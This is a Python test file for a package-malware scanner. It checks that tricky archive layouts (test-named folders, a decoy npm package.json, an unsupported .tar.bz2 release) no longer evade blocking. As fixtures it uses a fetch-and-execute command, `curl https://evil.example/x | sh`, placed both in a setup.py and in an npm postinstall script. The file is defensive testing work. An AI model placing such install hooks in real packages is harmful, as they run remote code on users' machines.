"""Archive layouts that used to switch the scan off (run: python3 tests/test_scan_bypass.py). Offline: local files only."""
import io
import json
import sys
import tarfile
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "guard"))
import safe_extract  # noqa: E402
import scan_engine as se  # noqa: E402
from sources import npm  # noqa: E402

PAYLOAD = "import os\nos.system('curl https://evil.example/x | sh')\n"


def targz(members: dict) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, text in members.items():
            data = text.encode()
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


with tempfile.TemporaryDirectory() as d:
    d = Path(d)
    # an sdist whose top folder is named tests/: pip still runs its setup.py, so it is read like any other
    verdicts = {}
    for top in ("evilpkg-1.0", "tests", "foo_test"):
        f = d / top / "evilpkg-1.0.tar.gz"
        f.parent.mkdir()
        f.write_bytes(targz({f"{top}/setup.py": PAYLOAD, f"{top}/PKG-INFO": "Name: evilpkg\nVersion: 1.0\n"}))
        verdicts[top] = se.scan_local_file(str(f)).verdict
    assert verdicts["evilpkg-1.0"] == "BLOCK" and set(verdicts.values()) == {"BLOCK"}, verdicts

    # a plugin named "test" is read like any other plugin
    hooks = d / "plug" / "hooks"
    hooks.mkdir(parents=True)
    (hooks / "run.py").write_text(PAYLOAD)
    for name in ("plug", "test", "foo-tests"):
        assert se.scan_bundle(name, [str(d / "plug")]).verdict == "BLOCK", name

    # npm drops the first path component: a one-component package.json beside package/package.json is not the root
    for label, members in (("plain", {}), ("decoy", {"package.json": json.dumps({"name": "x", "version": "1.0.0"})})):
        root = d / label / "x-1.0.0.tgz.unpacked"
        root.mkdir(parents=True)
        members = {**members, "package/package.json": json.dumps(
            {"name": "x", "version": "1.0.0", "scripts": {"postinstall": "curl https://evil.example/x | sh"}})}
        safe_extract.extract_targz(targz(members), root, [], npm.KEEP_SUFFIXES)
        files = list(root.rglob("*"))
        life = npm.write_lifecycle(files, d / label, "x-1.0.0")
        assert any("postinstall" in f.name for f in life), (label, life)

# a release file in a format that is not unpacked (.tar.bz2) is "not scanned", never an empty, clean-looking package
from sources import pypi  # noqa: E402
pypi.metadata = lambda n: {"info": {"version": "1.0"}, "releases": {"1.0": [
    {"packagetype": "sdist", "filename": "old-1.0.tar.bz2", "url": "https://files.pythonhosted.org/x/old-1.0.tar.bz2", "size": 4}]}}
pypi.urllib.request.urlopen = lambda *a, **k: io.BytesIO(b"BZh9")
with tempfile.TemporaryDirectory() as d:
    try:
        pypi.fetch("old", "1.0", Path(d))
        raise AssertionError("read an unknown format as an empty package")
    except ValueError as e:
        assert "not scanned" in str(e)
print("scan_bypass: all cases passed")
